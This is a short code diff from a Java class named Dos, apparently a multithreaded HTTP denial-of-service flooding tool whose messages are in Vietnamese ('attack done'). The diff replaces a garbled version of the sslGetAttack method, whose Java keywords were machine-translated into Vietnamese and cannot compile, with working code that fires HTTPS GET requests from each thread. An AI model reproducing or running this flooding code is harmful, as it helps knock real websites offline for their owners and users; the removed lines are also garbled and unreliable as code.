@@ -187,13 +187,14 @@ public class Dos implements Runnable {
         int responseCode = con.getResponseCode();
         System.out.println("GET Tấn Công Đã Xong!:" + responseCode + "Thread: " + this.seq);
     }
-        private  void  sslGetAttack ( Chuỗi  url ) ném  Ngoại lệ {
-        URL  obj = URL mới  ( url );
-        HttpsURLConnection  con = ( HttpsURLConnection ) obj . openConnection ();
-        con . setRequestMethod ( "NHẬN" );
-        con . setRequestProperty ( "Tác nhân người dùng" , USER_AGENT );
 
-        int  mã phản hồi = con . getResponseCode ();
-        Hệ thống . ra . println ( "NHẬN Tấn Công Đã Xong!: " + responseCode + "Thread: " + this . seq );
+    private void sslGetAttack(String url) throws Exception {
+        URL obj = new URL(url);
+        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
+        con.setRequestMethod("GET");
+        con.setRequestProperty("User-Agent", USER_AGENT);
+
+        int responseCode = con.getResponseCode();
+        System.out.println("GET Tấn Công Đã Xong!: " + responseCode + "Thread: " + this.seq);
     }
 }
